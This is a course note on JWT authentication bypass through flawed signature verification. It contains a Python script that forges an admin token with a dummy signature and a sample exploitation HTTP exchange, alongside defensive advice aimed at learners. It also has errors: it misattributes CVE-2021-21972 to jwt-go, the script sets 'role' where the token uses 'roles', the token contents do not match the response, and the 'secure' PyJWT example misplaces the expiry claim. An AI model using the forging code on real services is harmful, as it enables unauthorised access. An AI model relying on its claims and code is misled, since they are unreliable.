---
course: Web Security
topic: JWT Attacks
tags: [web-security]
---

## JWT Attacks: Authentication Bypass via Flawed Signature Verification

### Background Theory

JSON Web Tokens (JWTs) are a widely used method for transmitting information between parties as a JSON object. This information can be verified and trusted because it is digitally signed. JWTs consist of three parts separated by dots (`.`):

1. **Header**: Contains metadata about the token, such as the type of token and the signing algorithm used.
2. **Payload**: Contains the claims, which are statements about an entity and additional data.
3. **Signature**: Ensures the integrity of the header and payload, preventing tampering.

The structure of a JWT looks like this:

```
<base64UrlEncode(header)>.<base64UrlEncode(payload)>.<signature>
```

### Vulnerability: Flawed Signature Verification

A common vulnerability in JWT implementations is flawed signature verification. This occurs when the server does not properly validate the signature of the JWT, allowing attackers to craft their own tokens that are accepted by the server.

#### Real-World Example: CVE-2021-21972

In 2021, a critical vulnerability was discovered in the `jwt-go` library, which is widely used in Go applications. The vulnerability, tracked as CVE-2021-21972, allowed attackers to bypass authentication by manipulating the JWT payload. The issue stemmed from the fact that the library did not enforce the presence of a signature, leading to potential unauthorized access.

### Exploitation Steps

To exploit a JWT vulnerability due to flawed signature verification, an attacker would typically follow these steps:

1. **Obtain a Valid Token**: The attacker needs to obtain a valid JWT from a legitimate user. This can be done through various means, such as social engineering, phishing, or intercepting network traffic.
2. **Modify the Payload**: Once the attacker has a valid token, they can modify the payload to gain elevated privileges or access restricted resources.
3. **Forge the Signature**: Since the server is not properly verifying the signature, the attacker can either remove the signature or replace it with a dummy value. The server will accept the modified token as valid.

#### Example Code

Let's walk through an example of how an attacker might exploit this vulnerability using Python.

```python
import base64
import json

# Original JWT token obtained from a legitimate user
original_jwt = "eyJhbGciOiJIUzI1NiIsInR5cCI6IkpXVCJ9.eyJzdWIiOiJDb3JhbG9zIiwiaWQiOjEwMCwibmFtZSI6IkNvbGFzb2wiLCJyb2xlcyI6WyJjbGllbnQiXX0.abc123"

# Split the JWT into its components
header, payload, signature = original_jwt.split('.')

# Decode the header and payload
decoded_header = base64.urlsafe_b64decode(header + '==').decode('utf-8')
decoded_payload = base64.urlsafe_b64decode(payload + '==').decode('utf-8')

print("Original Header:", decoded_header)
print("Original Payload:", decoded_payload)

# Modify the payload to elevate privileges
modified_payload = json.loads(decoded_payload)
modified_payload['role'] = ['admin']
modified_payload_str = json.dumps(modified_payload)

# Encode the modified payload
encoded_modified_payload = base64.urlsafe_b64encode(modified_payload_str.encode('utf-8')).rstrip(b'=').decode('utf-8')

# Forge the signature (dummy value)
forged_signature = "dummy_signature"

# Construct the new JWT
new_jwt = f"{header}.{encoded_modified_payload}.{forged_signature}"

print("New JWT:", new_jwt)
```

### HTTP Request and Response

Here is an example of an HTTP request and response demonstrating the exploitation of a JWT vulnerability:

```http
POST /api/login HTTP/1.1
Host: vulnerable.example.com
Content-Type: application/json

{
    "token": "eyJhbGciOiJIUzI1NiIsInR5cCI6IkpXVCJ9.eyJzdWIiOiJDb3JhbG9zIiwiaWQiOjEwMCwibmFtZSI6IkNvbGFzb2wiLCJyb2xlcyI6WyJhZG1pbSJdfQ.dummy_signature"
}

HTTP/1.1 200 OK
Date: Tue, 14 Mar 2023 12:00:00 GMT
Content-Type: application/json
Content-Length: 102

{
    "message": "Login successful",
    "user": {
        "id": 100,
        "name": "Carlos",
        "roles": ["admin"]
    }
}
```

### How to Prevent / Defend

#### Detection

To detect JWT vulnerabilities, organizations should implement the following measures:

1. **Logging and Monitoring**: Monitor JWT-related activities and log all JWT validation failures.
2. **Security Scanning**: Use automated tools to scan for JWT vulnerabilities in your codebase.
3. **Penetration Testing**: Regularly perform penetration testing to identify and mitigate potential vulnerabilities.

#### Prevention

To prevent JWT vulnerabilities, follow these best practices:

1. **Proper Signature Verification**: Ensure that the server properly verifies the signature of the JWT. Use libraries that enforce strict signature validation.
2. **Use Strong Algorithms**: Use strong cryptographic algorithms for signing JWTs, such as RS256 or ES256.
3. **Secure Key Management**: Store and manage JWT keys securely. Avoid hardcoding keys in your codebase.
4. **Token Expiration**: Set appropriate expiration times for JWTs to limit their validity period.
5. **Regular Updates**: Keep your JWT libraries and dependencies up to date to patch known vulnerabilities.

#### Secure Coding Fixes

Here is an example of how to securely handle JWTs in Python using the `PyJWT` library:

```python
import jwt
from datetime import datetime, timedelta

# Secret key for signing the JWT
SECRET_KEY = 'your_secret_key'

# User data
user_data = {
    'sub': 'Carlos',
    'id': 100,
    'name': 'Carlos',
    'roles': ['client']
}

# Create a JWT with an expiration time
expiration_time = datetime.utcnow() + timedelta(minutes=30)
token = jwt.encode(user_data, SECRET_KEY, algorithm='HS256', headers={'exp': expiration_time})

print("JWT:", token)

# Verify the JWT
try:
    decoded_token = jwt.decode(token, SECRET_KEY, algorithms=['HS256'])
    print("Decoded Token:", decoded_token)
except jwt.ExpiredSignatureError:
    print("Token has expired")
except jwt.InvalidTokenError:
    print("Invalid token")
```

### Common Pitfalls

1. **Hardcoded Keys**: Avoid hardcoding secret keys in your codebase. Use environment variables or secure key management solutions.
2. **Weak Algorithms**: Using weak cryptographic algorithms can make your JWTs vulnerable to attacks. Always use strong algorithms like RS256 or ES256.
3. **Improper Validation**: Failing to properly validate the JWT signature can lead to authentication bypass vulnerabilities.
4. **Insufficient Logging**: Lack of proper logging and monitoring can make it difficult to detect and respond to JWT-related attacks.

### Practice Labs

For hands-on practice with JWT attacks, consider the following labs:

- **PortSwigger Web Security Academy**: Offers a comprehensive set of labs covering various aspects of web security, including JWT attacks.
- **OWASP Juice Shop**: A deliberately insecure web application for security training purposes, featuring JWT vulnerabilities.
- **DVWA (Damn Vulnerable Web Application)**: Another popular web application for security training, which includes JWT-related vulnerabilities.

By thoroughly understanding the concepts, mechanisms, and practical aspects of JWT attacks, you can better defend against them and ensure the security of your applications.

---
<!-- nav -->
[[09-JSON Web Tokens (JWT)|JSON Web Tokens (JWT)]] | [[Web Security (PortSwigger)/19-JWT Attacks/02-Lab 2 JWT authentication bypass via flawed signature verification/00-Overview|Overview]] | [[11-JWT Authentication Bypass via Flawed Signature Verification|JWT Authentication Bypass via Flawed Signature Verification]]
